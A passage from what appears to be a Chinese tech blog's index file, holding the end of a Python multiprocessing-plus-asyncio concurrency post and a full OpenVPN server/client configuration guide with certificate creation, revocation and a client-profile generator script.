r)</span></span><br><span class="line">    <span class="built_in">print</span>(time.time()-now, <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="进程-协程"><a href="#进程-协程" class="headerlink" title="进程+协程"></a>进程+协程</h2><p>使用多进程方式，主进程负责任务分组和工作进程创建，工作进程负责协程队列执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Time    : 2024-07-02 13:57:00</span></span><br><span class="line"><span class="comment"># @Author  : m0ch</span></span><br><span class="line"><span class="comment"># @Version : 1.0</span></span><br><span class="line"><span class="comment"># @License : GPLv2.0</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> AsyncResult</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MultiAsyncTask</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, concurrency=<span class="number">200</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>._loop = asyncio.new_event_loop()</span><br><span class="line">        asyncio.set_event_loop(<span class="variable language_">self</span>._loop)</span><br><span class="line">        <span class="variable language_">self</span>._semaphore = asyncio.Semaphore(concurrency)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_tasks</span>(<span class="params">self, tasks: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="type">Callable</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>]]</span>):</span><br><span class="line">        coros = [<span class="variable language_">self</span>._warp(func, args, kwargs) <span class="keyword">for</span> func, args, kwargs <span class="keyword">in</span> tasks]</span><br><span class="line">        results: <span class="built_in">list</span> = <span class="variable language_">self</span>._loop.run_until_complete(asyncio.gather(*coros, return_exceptions=<span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_warp</span>(<span class="params">self, func: <span class="type">Callable</span>, args: <span class="built_in">tuple</span>, kwargs: <span class="built_in">dict</span></span>):</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">self</span>._semaphore.acquire()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = <span class="keyword">await</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="variable language_">self</span>._semaphore.release()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_run_async_tasks</span>(<span class="params">tasks: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="type">Callable</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>]], concurrency: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="comment"># print(&#x27;Worker process %s.&#x27; % os.getpid())</span></span><br><span class="line">    mt = MultiAsyncTask(concurrency)</span><br><span class="line">    <span class="keyword">return</span> mt.run_tasks(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_tasks_multiprocess</span>(<span class="params">tasks: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="type">Callable</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>]], pnum: <span class="built_in">int</span> = <span class="literal">None</span>, cnum: <span class="built_in">int</span> = <span class="number">200</span></span>):</span><br><span class="line">    <span class="comment"># print(&#x27;Master process %s.&#x27; % os.getpid())</span></span><br><span class="line">    pnum = pnum <span class="keyword">or</span> os.cpu_count() + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tasks) &lt; pnum:</span><br><span class="line">        pnum = <span class="number">1</span></span><br><span class="line">    t_len = math.ceil(<span class="built_in">len</span>(tasks)/pnum)</span><br><span class="line">    seprated_coros_s = [tasks[i:i+t_len] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tasks), t_len)]</span><br><span class="line"></span><br><span class="line">    p = multiprocessing.Pool(pnum)</span><br><span class="line">    p_results: <span class="built_in">list</span>[AsyncResult] = []</span><br><span class="line">    <span class="keyword">for</span> seprated_coros <span class="keyword">in</span> seprated_coros_s:</span><br><span class="line">        p_result = p.apply_async(_run_async_tasks, args=(seprated_coros, cnum))</span><br><span class="line">        p_results.append(p_result)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line">    task_results = []</span><br><span class="line">    <span class="keyword">for</span> p_result <span class="keyword">in</span> p_results:</span><br><span class="line">        task_results.extend(p_result.get())</span><br><span class="line">    <span class="keyword">return</span> task_results</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">coro_test</span>(<span class="params">i: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="comment"># if i % 5 == 0:</span></span><br><span class="line">        <span class="comment">#     raise ValueError(&quot;test err&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">        tasks.append((coro_test, (i,), &#123;&#125;))</span><br><span class="line">    </span><br><span class="line">    now = time.time()</span><br><span class="line">    task_results = run_tasks_multiprocess(tasks, pnum=<span class="number">19</span>, cnum=<span class="number">2000</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> task_results:</span><br><span class="line">        r</span><br><span class="line">        <span class="comment"># print(&quot;result: &quot;, r)</span></span><br><span class="line">    <span class="built_in">print</span>(time.time()-now, <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenVPN简单配置</title>
      <link href="/2023/03/03/Network/openvpn/"/>
      <url>/2023/03/03/Network/openvpn/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://openvpn.net/community-resources/reference-manual-for-openvpn-2-6">OpenVPN2.6官方文档</a></p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install openvpn easy-rsa</span><br></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>路径：<code>/etc/openvpn/server</code></p><h2 id="创建证书"><a href="#创建证书" class="headerlink" title="创建证书"></a>创建证书</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/openvpn/server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化PKI，会在当前路径下生成pki文件夹，后续证书在此文件夹内</span></span><br><span class="line">/usr/share/easy-rsa/easyrsa init-pki</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成无密码CA证书和私钥 </span></span><br><span class="line">/usr/share/easy-rsa/easyrsa build-ca nopass <span class="comment"># 创建无密码ca</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建无密码服务端证书</span></span><br><span class="line">/usr/share/easy-rsa/easyrsa build-server-full &lt;server-name&gt; nopass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建无密码客户端证书</span></span><br><span class="line">/usr/share/easy-rsa/easyrsa build-client-full &lt;client-name&gt; nopass</span><br></pre></td></tr></table></figure><h2 id="server-conf"><a href="#server-conf" class="headerlink" title="server.conf"></a>server.conf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"># 默认绑定在所有网络接口上，如需绑定在特定接口取消该行注释</span><br><span class="line">local &lt;server-ip&gt;</span><br><span class="line"></span><br><span class="line"># 监听端口，默认1194</span><br><span class="line">port &lt;server-port&gt;</span><br><span class="line"></span><br><span class="line"># OpenVPN使用的虚拟设备类型，包括tun和tap两种，默认为tun</span><br><span class="line">dev tun</span><br><span class="line"></span><br><span class="line"># 使用TCP或者UDP协议，可在其后加6监听IPv6端口</span><br><span class="line">;proto tcp</span><br><span class="line">;proto udp6</span><br><span class="line">proto udp</span><br><span class="line"></span><br><span class="line"># 数据加密算法</span><br><span class="line">data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305</span><br><span class="line"></span><br><span class="line"># 证书位置</span><br><span class="line">ca pki/ca.crt</span><br><span class="line"># `chmod +rx pki &amp;&amp; chmod +r pki/crl.pem`命令确保openvpn有权限读pki/crl.pem</span><br><span class="line">crl-verify pki/crl.pem</span><br><span class="line">cert pki/issued/&lt;serve-rname&gt;.crt</span><br><span class="line">key pki/private/&lt;server-name&gt;.key</span><br><span class="line"></span><br><span class="line"># OpenVPN分配的VPN内部网络地址和掩码，客户端将通过该地址访问VPN</span><br><span class="line">;server 10.8.0.0 255.255.255.0</span><br><span class="line">server-ipv6 fc0c::/64</span><br><span class="line"></span><br><span class="line"># 向客户端推送静态路由</span><br><span class="line">;push &quot;route 192.168.10.0 255.255.255.0&quot;</span><br><span class="line">;push &quot;route 192.168.20.0 255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line"># 推送网关</span><br><span class="line">;push &quot;redirect-gateway def1 bypass-dhcp&quot;</span><br><span class="line">push &quot;redirect-gateway ipv6 !ipv4 bypass-dhcp&quot;</span><br><span class="line"></span><br><span class="line"># 通过OpenVPN DHCP推送DNS</span><br><span class="line">push &quot;dhcp-option DNS 2402:4e00::&quot;</span><br><span class="line"></span><br><span class="line"># 保持连接，第一个参数为心跳间隔，第二个参数是超时间隔</span><br><span class="line">keepalive 10 120</span><br><span class="line"></span><br><span class="line"># 客户端之间相互访问</span><br><span class="line">;client-to-client</span><br><span class="line"></span><br><span class="line"># 保证同一个客户端（证书）每次连接时分配相同的IP地址，与--duplicate-cn冲突</span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line"></span><br><span class="line"># 同一个客户端证书同时建立多个连接</span><br><span class="line">;duplicate-cn</span><br><span class="line"></span><br><span class="line"># OpenVPN的状态日志，多个OpenVPN服务器使用分别的文件名，默认在systemd命令行中配置</span><br><span class="line">;status openvpn-status.log</span><br><span class="line"></span><br><span class="line"># 启用内部数据报分段，以便不发送大于最大字节的UDP数据报，仅在UDP通道模式下可用</span><br><span class="line"># 应该注意的是，此选项并不意味着在IP堆栈级别替换UDP分段。它仅作为PMTU发现中断时的最后手段</span><br><span class="line"># 使用此选项的效率低于修复IP链路的PMTU发现并改用本机IP分段，如果PMTU可用，则无需此配置</span><br><span class="line">;fragment 0</span><br><span class="line"></span><br><span class="line"># UDP通道模式下的TCP MSS修补</span><br><span class="line">;mssfix</span><br><span class="line"></span><br><span class="line"># TUN设备网络模式，支持net30（30位子网），p2p（点对点），subnet（大子网）</span><br><span class="line">topology subnet</span><br><span class="line"></span><br><span class="line"># 默认TUN设备MTU值1500，可手动配置</span><br><span class="line">tun-mtu 1500</span><br><span class="line"></span><br><span class="line"># Diffie-Hellman参数文件路径，用于生成密钥协商所需的参数</span><br><span class="line"># 使用`openssl dhparam -out dh2048.pem 2048`命令生成</span><br><span class="line">dh dh2048.pem</span><br><span class="line"></span><br><span class="line"># 数据通道和控制通道的HMAC认证采用的hash</span><br><span class="line">auth SHA512</span><br><span class="line"></span><br><span class="line"># 控制通道的tls认证秘钥及认证方向</span><br><span class="line"># 使用`openvpn --genkey tls-auth ta.key`命令生成key</span><br><span class="line">;tls-auth ta.key 0</span><br><span class="line"></span><br><span class="line"># 控制通道的tls认证及加密秘钥（与tls-auth二选一）</span><br><span class="line"># 使用`openvpn --genkey tls-crypt tc.key`命令生成key</span><br><span class="line">tls-crypt tc.key</span><br><span class="line"></span><br><span class="line"># 设置进程运行用户</span><br><span class="line">user nobody</span><br><span class="line">group nogroup</span><br><span class="line"></span><br><span class="line"># key和tun设备持久化。可以尽量避免访问那些在重启之后由于用户权限降低而无法访问的某些资源</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line"># 以追加模式记录运行日志</span><br><span class="line">log-append /var/log/openvpn/openvpn.log</span><br><span class="line"></span><br><span class="line"># 输出一个简短的状态文件，用于显示当前的连接状态，该文件每分钟都会清空并重写一次</span><br><span class="line">;status openvpn-status.log</span><br><span class="line"></span><br><span class="line"># 日志详细级别</span><br><span class="line">verb 3</span><br><span class="line"></span><br><span class="line"># 显式退出通知</span><br><span class="line">explicit-exit-notify 1</span><br></pre></td></tr></table></figure><h2 id="client-conf"><a href="#client-conf" class="headerlink" title="client.conf"></a>client.conf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">proto udp</span><br><span class="line">dev tun</span><br><span class="line">remote &lt;server-ip&gt; &lt;server-port&gt;</span><br><span class="line"></span><br><span class="line">data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305</span><br><span class="line"></span><br><span class="line">auth SHA512</span><br><span class="line"></span><br><span class="line"># 验证服务端证书，防止中间人攻击</span><br><span class="line">remote-cert-tls server</span><br><span class="line"></span><br><span class="line">tun-mtu 1500</span><br><span class="line"></span><br><span class="line"># 旨在简化 OpenVPN 客户端模式配置的帮助指令。该指令相当于：pull 和 tls-client</span><br><span class="line">client</span><br><span class="line"></span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">explicit-exit-notify</span><br><span class="line">verb 3</span><br><span class="line"></span><br><span class="line"># 内联嵌入各个认证证书</span><br><span class="line">&lt;tls-crypt&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/tls-crypt&gt;</span><br><span class="line"></span><br><span class="line">&lt;ca&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/ca&gt;</span><br><span class="line"></span><br><span class="line">&lt;cert&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/cert&gt;</span><br><span class="line"></span><br><span class="line">&lt;key&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/key&gt;</span><br></pre></td></tr></table></figure><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start openvpn-server@&lt;conf-name&gt;</span><br><span class="line">systemctl <span class="built_in">enable</span> openvpn-server@&lt;conf-name&gt; <span class="comment"># 开机自启动</span></span><br></pre></td></tr></table></figure><h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><p>需要将<code>client.conf</code>传输到client，使用openvpn windows&#x2F;linux客户端</p><h1 id="吊销证书"><a href="#吊销证书" class="headerlink" title="吊销证书"></a>吊销证书</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 吊销证书</span></span><br><span class="line">/usr/share/easy-rsa/easyrsa revoke &lt;client-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成证书吊销列表crl</span></span><br><span class="line">/usr/share/easy-rsa/easyrsa gen-crl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保openvpn有权限读取crl</span></span><br><span class="line"><span class="built_in">chmod</span> +rx pki &amp;&amp; <span class="built_in">chmod</span> +r pki/crl.pem</span><br></pre></td></tr></table></figure><h1 id="快速操作脚本"><a href="#快速操作脚本" class="headerlink" title="快速操作脚本"></a>快速操作脚本</h1><p>根据已有证书快速生成客户端配置文件：</p><p>需提前创建存放文件夹:<code>mkdir client</code></p><p><code>fastgen</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line">ovpn = <span class="string">&quot;&quot;&quot;proto udp</span></span><br><span class="line"><span class="string">dev tun</span></span><br><span class="line"><span class="string">tun-ipv6</span></span><br><span class="line"><span class="string">remote &lt;server-ip&gt; &lt;server-port&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305</span></span><br><span class="line"><span class="string">auth SHA512</span></span><br><span class="line"><span class="string">remote-cert-tls server</span></span><br><span class="line"><span class="string">tun-mtu 1500</span></span><br><span class="line"><span class="string">client</span></span><br><span class="line"><span class="string">nobind</span></span><br><span class="line"><span class="string">persist-key</span></span><br><span class="line"><span class="string">persist-tun</span></span><br><span class="line"><span class="string">explicit-exit-notify</span></span><br><span class="line"><span class="string">verb 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;tls-crypt&gt;</span></span><br><span class="line"><span class="string">&#123;tls_crypt&#125;</span></span><br><span class="line"><span class="string">&lt;/tls-crypt&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;ca&gt;</span></span><br><span class="line"><span class="string">&#123;ca&#125;</span></span><br><span class="line"><span class="string">&lt;/ca&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># &#123;name&#125;</span></span><br><span class="line"><span class="string">&lt;cert&gt;</span></span><br><span class="line"><span class="string">&#123;cert&#125;</span></span><br><span class="line"><span class="string">&lt;/cert&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;key&gt;</span></span><br><span class="line"><span class="string">&#123;key&#125;</span></span><br><span class="line"><span class="string">&lt;/key&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.chdir(<span class="string">&quot;/etc/openvpn/server&quot;</span>)</span><br><span class="line">    name = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tc.key&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> i,line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;BEGIN&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                tls_crypt = <span class="string">&quot;&quot;</span>.join(lines[i:]).strip()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pki/ca.crt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        ca = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;pki/issued/<span class="subst">&#123;name&#125;</span>.crt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> i,line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;BEGIN&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                cert = <span class="string">&quot;&quot;</span>.join(lines[i:]).strip()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;pki/private/<span class="subst">&#123;name&#125;</span>.key&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        key = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;client/<span class="subst">&#123;name&#125;</span>.ovpn&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ovpn.<span class="built_in">format</span>(tls_crypt=tls_crypt, ca=ca, cert=cert, key=key, name=name))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Outfile: client/<span class="subst">&#123;name&#125;</span>.ovpn&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="故障处理"><a href="#故障处理" class="headerlink" title="故障处理"></a>故障处理</h1><p>客户端连接报错<code>tls-crypt unwrap error: packet replay</code>，服务端日志报错<code>VERIFY ERROR: depth=0, error=CRL has expired: CN=xxx, serial=xxx</code>，原因是证书吊销列表（CRL）过期，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/easy-rsa/easyrsa gen-crl</span><br><span class="line"><span class="built_in">chmod</span> +rx pki &amp;&amp; <span class="built_in">chmod</span> +r pki/crl.pem</span><br></pre></td></tr></table></figure><p>重新生成CRL即可。</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> VPN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由 </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具集合</title>
      <link href="/2023/01/31/Tools/crack/"/>
      <url>/2023/01/31/Tools/crack/</url>
      
